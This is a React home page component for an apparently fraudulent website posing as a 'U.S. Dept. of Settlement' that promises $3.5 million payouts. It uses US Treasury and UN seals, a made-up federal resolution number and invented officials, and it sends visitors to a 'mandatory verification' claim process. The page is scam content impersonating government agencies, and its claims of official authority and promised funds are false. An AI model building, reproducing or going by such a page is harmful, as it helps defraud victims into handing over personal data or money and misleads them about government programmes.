import React from 'react';
import { motion } from 'framer-motion';
import { 
  ShieldCheck, 
  Mail, 
  Landmark, 
  ArrowRight, 
  Globe, 
  Star, 
  Quote, 
  CheckCircle2, 
  Calculator,
  UserCheck,
  ShieldAlert,
  Scale,
  Handshake,
  Lock,
  Building2,
  Users,
  FileText
} from 'lucide-react';
import { fadeInUp, staggerContainer } from '../lib/animations.ts';
import MotionButton from '../components/MotionButton.tsx';

interface HomeProps {
  onStart: () => void;
}

const Home: React.FC<HomeProps> = ({ onStart }) => {
  return (
    <div className="pt-24 pb-16 overflow-hidden">
      {/* Hero Section */}
      <section className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mb-24 min-h-[80vh] flex items-center">
        {/* Flag Stripe Background */}
        <div className="absolute top-0 right-0 w-1/3 h-full bg-slate-50 -z-10 opacity-50" />
        
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center w-full">
          <motion.div 
            variants={fadeInUp}
            initial="initial"
            animate="animate"
            className="space-y-8 text-left relative z-10"
          >
            <div className="flex items-center gap-4">
              <motion.div 
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="inline-flex items-center gap-2 px-4 py-2 rounded bg-[#002868] text-white text-[10px] font-black uppercase tracking-[0.2em]"
              >
                Federal Resolution BIS/2025
              </motion.div>
              <div className="h-px flex-grow bg-slate-200" />
            </div>
            
            <h1 className="text-6xl md:text-7xl font-black text-slate-900 tracking-tighter leading-none">
              <span className="text-[#002868]">U.S. DEPT.</span> OF <br />
              SETTLEMENT <br />
              <span className="text-[#BF0A30]">$3.5 MILLION</span>
            </h1>
            
            <p className="text-xl text-slate-700 font-medium leading-relaxed max-w-xl border-l-4 border-[#BF0A30] pl-6">
              Official 2025 allocation for recovery of lost assets and compensation for US-eligible beneficiaries. 
              Authorized by the Department of the Treasury and BIS.
            </p>

            <div className="flex flex-col sm:flex-row gap-4 pt-4">
              <MotionButton 
                onClick={onStart} 
                variant="primary" 
                className="text-sm font-black uppercase tracking-widest px-10 py-5 bg-[#002868] hover:bg-slate-900 shadow-2xl rounded-none"
              >
                Initiate Official Claim <ArrowRight className="w-5 h-5" />
              </MotionButton>
              <div className="flex items-center gap-3 px-6 text-slate-500 font-bold text-xs uppercase tracking-widest">
                <FileText className="w-4 h-4 text-[#BF0A30]" />
                Directive 2025-A1
              </div>
            </div>

            <div className="flex items-center gap-6 opacity-30">
              <img src="https://upload.wikimedia.org/wikipedia/commons/e/ee/UN_emblem_blue.svg" className="h-10 grayscale" alt="United Nations" />
              <div className="w-px h-8 bg-slate-300" />
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Seal_of_the_United_States_Department_of_the_Treasury.svg/512px-Seal_of_the_United_States_Department_of_the_Treasury.svg.png" className="h-10 grayscale" alt="US Treasury" />
            </div>
          </motion.div>
          
          <motion.div 
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 1.2 }}
            className="relative hidden lg:block"
          >
            <div className="relative z-10 rounded-none overflow-hidden shadow-[30px_30px_0px_0px_#002868] border-8 border-white group">
              <img 
                src="https://images.unsplash.com/photo-1550985543-f47f38aee62e?auto=format&fit=crop&q=80&w=1200" 
                alt="US Treasury Department" 
                className="w-full h-[600px] object-cover"
              />
              <div className="absolute top-0 left-0 w-full h-full bg-blue-900/10 mix-blend-multiply" />
              <div className="absolute inset-x-0 bottom-0 bg-[#002868]/90 p-8 text-white">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-[10px] font-black uppercase tracking-[0.3em] text-[#BF0A30] mb-2">Federal Jurisdiction</p>
                    <p className="text-xl font-bold tracking-tight">Washington D.C. HQ • Division of Monetary Settlement</p>
                  </div>
                  <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" className="h-8 shadow-md" alt="Flag" />
                </div>
              </div>
            </div>
            
            <motion.div 
              animate={{ rotate: 360 }}
              transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
              className="absolute -top-12 -right-12 w-32 h-32 bg-white rounded-full p-2 shadow-2xl z-20 border-4 border-slate-100 flex items-center justify-center"
            >
              <Landmark className="w-12 h-12 text-[#002868]" />
            </motion.div>
          </motion.div>
        </div>
      </section>

      {/* Global Oversight & Governance Section */}
      <section className="py-24 bg-white border-y border-slate-100 relative">
        <div className="absolute top-0 left-0 w-full h-1 bg-[#BF0A30]" />
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
            <motion.div 
              initial={{ opacity: 0, x: -30 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ once: true }}
              className="space-y-8"
            >
              <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded bg-slate-100 text-[#002868] text-[10px] font-black uppercase tracking-[0.2em]">
                <Scale className="w-4 h-4" /> Federal Audit Compliant
              </div>
              <h2 className="text-5xl font-black text-slate-900 tracking-tighter leading-tight uppercase">
                Strict Institutional <br /> Oversight
              </h2>
              <p className="text-lg text-slate-700 font-medium leading-relaxed italic border-l-4 border-slate-900 pl-6">
                "The 2025 settlement represents the largest recovery initiative in history. Every claim is verified against our Federal Asset Database to ensure total legitimacy."
              </p>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-8">
                <div className="space-y-2">
                  <h4 className="font-black text-slate-900 uppercase text-sm tracking-tighter">Authorized Payers</h4>
                  <p className="text-xs text-slate-500 font-bold uppercase leading-relaxed">Centralized US Disbursement Centers in Washington, NY, and Basel.</p>
                </div>
                <div className="space-y-2">
                  <h4 className="font-black text-slate-900 uppercase text-sm tracking-tighter">Security Protocol</h4>
                  <p className="text-xs text-slate-500 font-bold uppercase leading-relaxed">Multi-factor federal identity verification required for all $3.5M claims.</p>
                </div>
              </div>
            </motion.div>
            <motion.div 
              initial={{ opacity: 0 }}
              whileInView={{ opacity: 1 }}
              viewport={{ once: true }}
              className="grid grid-cols-2 gap-4"
            >
              <div className="space-y-4 pt-12">
                <img 
                  src="https://images.unsplash.com/photo-1529156069898-49953e39b3ac?auto=format&fit=crop&q=80&w=800" 
                  alt="D.C. Capitol" 
                  className="rounded-none shadow-xl w-full h-72 object-cover border-4 border-white grayscale hover:grayscale-0 transition-all duration-500"
                />
                <img 
                  src="https://images.unsplash.com/photo-1521791136064-7986c2920216?auto=format&fit=crop&q=80&w=600" 
                  alt="Handshake" 
                  className="rounded-none shadow-xl w-full h-48 object-cover border-4 border-white grayscale hover:grayscale-0 transition-all duration-500"
                />
              </div>
              <div className="space-y-4">
                <img 
                  src="https://images.unsplash.com/photo-1589262804704-c5aa9e66c07a?auto=format&fit=crop&q=80&w=800" 
                  alt="Supreme Court" 
                  className="rounded-none shadow-xl w-full h-56 object-cover border-4 border-white grayscale hover:grayscale-0 transition-all duration-500"
                />
                <div className="bg-[#002868] p-8 aspect-square flex flex-col justify-center text-white">
                  <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" className="h-6 w-10 mb-4" alt="Flag" />
                  <h4 className="text-2xl font-black uppercase tracking-tighter mb-2">2025 Policy</h4>
                  <p className="text-[10px] font-bold opacity-70 uppercase tracking-widest leading-relaxed">Federal Executive Directive For Recovery & Growth</p>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </section>

      {/* Trust & Compliance Section */}
      <section className="py-24 bg-[#002868] text-white overflow-hidden relative">
        <div className="absolute top-0 left-0 w-full h-1.5 bg-[#BF0A30]" />
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
          <div className="text-center mb-16">
            <h2 className="text-4xl font-black uppercase tracking-tighter mb-4">Federal Fraud Prevention</h2>
            <div className="w-24 h-1 bg-[#BF0A30] mx-auto mb-6" />
            <p className="text-blue-100 font-bold max-w-2xl mx-auto uppercase text-xs tracking-widest">Ensuring 100% Protection of Beneficiary Personal Data</p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {[
              {
                icon: <Lock className="w-8 h-8 text-[#BF0A30]" />,
                title: "Data Encryption",
                desc: "All submissions are processed through the US Federal Secure Sockets Layer (SSL)."
              },
              {
                icon: <ShieldAlert className="w-8 h-8 text-[#BF0A30]" />,
                title: "Anti-Phishing",
                desc: "Official agents will never request social security numbers or private bank PINs."
              },
              {
                icon: <CheckCircle2 className="w-8 h-8 text-[#BF0A30]" />,
                title: "Authorized Portal",
                desc: "This is the ONLY approved portal for File BIS/CPM/025 disbursements."
              }
            ].map((item, idx) => (
              <div key={idx} className="bg-white/5 border border-white/10 p-8 hover:bg-white/10 transition-colors">
                <div className="mb-6">{item.icon}</div>
                <h3 className="text-xl font-bold uppercase tracking-tighter mb-3">{item.title}</h3>
                <p className="text-blue-200 text-sm font-medium leading-relaxed">{item.desc}</p>
              </div>
            ))}
          </div>
        </div>
        <div className="absolute bottom-0 right-0 w-64 h-64 bg-white/5 rounded-full -mr-32 -mb-32 blur-3xl" />
      </section>

      {/* Leadership Section */}
      <section className="bg-slate-50 py-24">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col md:flex-row justify-between items-end mb-16 gap-6">
            <div className="text-left">
              <h2 className="text-4xl font-black text-slate-900 tracking-tighter uppercase mb-2">Executive Committee</h2>
              <div className="flex gap-1">
                {[...Array(5)].map((_, i) => <Star key={i} className="w-3 h-3 text-[#BF0A30] fill-[#BF0A30]" />)}
              </div>
            </div>
            <p className="text-slate-500 font-bold uppercase text-[10px] tracking-widest">Department of International Settlement 2025</p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
            {[
              {
                name: "Sir David Sterling",
                role: "Lead Settlement Commissioner",
                img: "https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?auto=format&fit=crop&q=80&w=400"
              },
              {
                name: "Dr. Elena Vance",
                role: "UNCC Federal Liaison",
                img: "https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&q=80&w=400"
              },
              {
                name: "Marcus Cole",
                role: "Chief Compliance Officer",
                img: "https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?auto=format&fit=crop&q=80&w=400"
              },
              {
                name: "Sarah Chen",
                role: "Treasury Asset Recovery",
                img: "https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&q=80&w=400"
              }
            ].map((leader, idx) => (
              <motion.div 
                key={idx}
                initial={{ opacity: 0, y: 20 }}
                whileInView={{ opacity: 1, y: 0 }}
                transition={{ delay: idx * 0.1 }}
                className="group bg-white border border-slate-200 shadow-sm"
              >
                <div className="aspect-[4/5] overflow-hidden relative">
                  <img 
                    src={leader.img} 
                    alt={leader.name} 
                    className="w-full h-full object-cover grayscale transition-all duration-500 group-hover:grayscale-0"
                  />
                  <div className="absolute top-4 left-4">
                    <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" className="h-3 w-5 opacity-50 shadow" alt="Flag" />
                  </div>
                </div>
                <div className="p-6">
                  <h4 className="text-lg font-black text-slate-900 tracking-tighter uppercase">{leader.name}</h4>
                  <p className="text-[10px] font-black text-[#BF0A30] uppercase tracking-widest mt-1">{leader.role}</p>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* Official Roadmap */}
      <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-24">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-0 border border-slate-200">
          {[
            {
              step: "01",
              title: "Identity Check",
              desc: "Re-confirmation of US-eligible status via Federal Database."
            },
            {
              step: "02",
              title: "File Assignment",
              desc: "Mapping claim to File BIS/CPM/025 for $3.5M allocation."
            },
            {
              step: "03",
              title: "Funds Release",
              desc: "Authorized transfer via Federal Reserve Bank accredited nodes."
            }
          ].map((item, idx) => (
            <div key={idx} className={`p-10 ${idx !== 2 ? 'border-b md:border-b-0 md:border-r border-slate-200' : ''} bg-white hover:bg-slate-50 transition-colors`}>
              <span className="text-[10px] font-black text-[#BF0A30] uppercase tracking-[0.3em] mb-4 block">Section {item.step}</span>
              <h4 className="text-2xl font-black text-slate-900 tracking-tighter uppercase mb-3">{item.title}</h4>
              <p className="text-slate-500 text-sm font-medium leading-relaxed">{item.desc}</p>
            </div>
          ))}
        </div>
      </section>

      {/* Final Call to Action */}
      <section className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 pb-24 text-center">
        <div className="bg-slate-900 p-12 md:p-20 relative overflow-hidden">
          <div className="absolute top-0 left-0 w-2 h-full bg-[#BF0A30]" />
          <div className="absolute top-0 right-0 w-2 h-full bg-[#002868]" />
          <h3 className="text-3xl md:text-5xl font-black text-white tracking-tighter uppercase mb-6 leading-tight">
            Initiate Your 2025 <br /> Federal Settlement Today
          </h3>
          <p className="text-slate-400 font-bold uppercase text-[10px] tracking-[0.4em] mb-10">
            Mandatory Verification Required
          </p>
          <MotionButton 
            onClick={onStart} 
            className="bg-white text-slate-900 font-black uppercase tracking-widest px-12 py-5 rounded-none hover:bg-[#BF0A30] hover:text-white transition-all shadow-2xl"
          >
            Start Lodgement Process
          </MotionButton>
        </div>
      </section>
    </div>
  );
};

export default Home;